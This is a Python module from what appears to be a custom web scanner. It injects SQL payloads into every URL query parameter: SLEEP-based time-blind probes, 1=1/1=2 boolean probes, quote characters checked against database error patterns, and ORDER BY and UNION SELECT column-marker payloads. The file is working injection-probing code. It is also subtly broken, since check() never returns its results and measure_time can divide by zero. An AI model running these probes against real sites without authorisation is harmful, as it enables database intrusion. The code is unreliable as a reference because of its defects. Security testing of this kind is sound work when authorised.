import time
import urllib.parse  #URL解析核心库
import copy
import difflib  #
import re
from core import requestor
from utils.logger import info, success



# URL处理
#拆
def parse_url_params(url):
    parsed = urllib.parse.urlparse(url) #拆URL结构
    params = urllib.parse.parse_qs(parsed.query)  #把query转dict
    return parsed, params

#建
def build_url(parsed, params):
    query = urllib.parse.urlencode(params, doseq=True) #把dict转为query
    #拼接
    return urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, query, parsed.fragment
    ))

#注入函数
def inject_param(url, param, payload):
    parsed, params = parse_url_params(url)
    #防御性编译：避免异常
    if param not in params:
        return None

    #深拷贝，否则原始参数会被污染
    new_params = copy.deepcopy(params)
    #注入
    new_params[param] = [params[param][0] + payload]
    return build_url(parsed, new_params)



# 主入口
def check(url):
    parsed, params = parse_url_params(url)
    if not params:
        return None

    #baseline请求
    base = requestor.get(url)
    if not base:
        return None

    base_text = base.text
    base_len = len(base_text)

    #初始化
    results = []

    for param in params:
        info(f"测试参数: {param}")
        # 时间盲注（必须对比）
        baseline_time = measure_time(url,repeat=5)

        payload_sleep = "' AND SLEEP(5)--"
        payload_normal = "' AND SLEEP(0)--"

        url_sleep = inject_param(url,param,payload_sleep)
        url_normal = inject_param(url,param,payload_normal)

        t_sleep = measure_time(url_sleep,repeat=5)
        t_normal = measure_time(url_normal,repeat=5)


        if (t_sleep - t_normal > 3) and (t_sleep > baseline_time + 3):
            success(f"时间盲注: {param}")
            results.append({
                "type": "sqli",
                "method": "time_blind",
                "param": param,
                "url": url
            })

        # 布尔盲注（核心）
        
        url_true = inject_param(url, param, "' AND 1=1-- ")
        url_false = inject_param(url, param, "' AND 1=2-- ")

        r_true = requestor.get(url_true)
        r_false = requestor.get(url_false)

        if r_true and r_false:
            text_t = r_true.text
            text_f = r_false.text

            #长度
            len_t = len(r_true.text)
            len_f = len(r_false.text)
            #相似度
            sim_t = similarity(base_text,text_t)
            sim_f = similarity(base_text,text_f)

            #真布尔和假布尔的差异
            sim_tf = similarity(text_t,text_f)


            
            if (sim_t > 0.95 and 
                sim_f < 0.9 and 
                sim_tf < 0.9 and 
                abs(len_t - base_len) < 50 and 
                abs(len_f - base_len) > 30 and
                similarity(text_t,text_f) < 0.85
                ):
                success(f"布尔盲注: {param}")
                results.append({
                    "type": "sqli",
                    "method": "boolean_blind",
                    "param": param,
                    "url": url
                })

        # 报错注入

        #错误指纹库
        ERROR_PATTERNS = [
            #mysql
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"mysql_fetch",

            #mssql
            r"unclosed quotation mark",
            r"microsoft sql server",

            #postgresql
            r"pg_query",
            r"postgresql.*error",

            #oracle
            r"ora-\d+",

            #sqlite
            r"sqlite error",
            r"sqlite3.*error",

            #通用
            r"syntax error",
            r"unexpected end",
        ]

        payloads = ["'","\"","\"))"]

        for payload in payloads:

            test_url = inject_param(url, param, payload)
            r = requestor.get(test_url)

            if not r:
                continue
            text = r.text.lower()
            #用正则re,来查询，精准匹配错误结构
            matched = any(re.search(p,text) for p in ERROR_PATTERNS)

            sim = similarity(base_text,text)
            #状态码
            status_abnormal = r.status_code >= 500

            if matched and (sim < 0.95 and status_abnormal):
                    success(f"报错注入: {param}")
                    results.append({
                        "type": "sqli",
                        "method": "error_based",
                        "param": param,
                        "url": url
                    })

                    #命中一个就结束
                    break

        #  UNION
        MAX_COLUMN = 8
        MARK = "qztest123"
        found_columns = None

        #列数探测
        for i in range(1,MAX_COLUMN + 1):
            test_url = inject_param(url,param,f"' ORDER BY {i}--")
            r = requestor.get(test_url)

            if not r:
                continue

            #出现异常：列数探测
            if r.status_code >= 500 or len(r.text) < base_len * 0.8:
                found_columns = i - 1
                break
        #防止没有测出来
        if not found_columns:
            found_columns = 3

            #payload
        for i in range(1,found_columns + 1):
            payload_list = ["NULL"] * found_columns
            payload_list[i - 1] = f"'{MARK}'"

            union_payload = "' union select " + ",".join(payload_list) + "-- "

            union_url = inject_param(url,param,union_payload)
            r_union = requestor.get(union_url)

            if not r_union:
                continue
            text = r_union.text
            
            #检测标记
            mark_hit = MARK in text

            sim = similarity(base_text,text)

            if mark_hit and sim < 0.95:
                success(f"UNION注入(疑似): {param}")
                results.append({
                    "type": "sqli",
                    "method": "union",
                    "param": param,
                    "url": url,
                    "columns":found_columns
                })

                break


# 时间测量（关键工具）
def measure_time(url,repeat = 5):
    times = []
    for _ in range(repeat):
        start = time.time()
        r = requestor.get(url,timeout=10)
        if not r:
            continue
        times.append(time.time() - start)
    return sum(times) / len(times)

#相似性，返回0-1
def similarity(a,b):
    return difflib.SequenceMatcher(None,a,b).ratio()
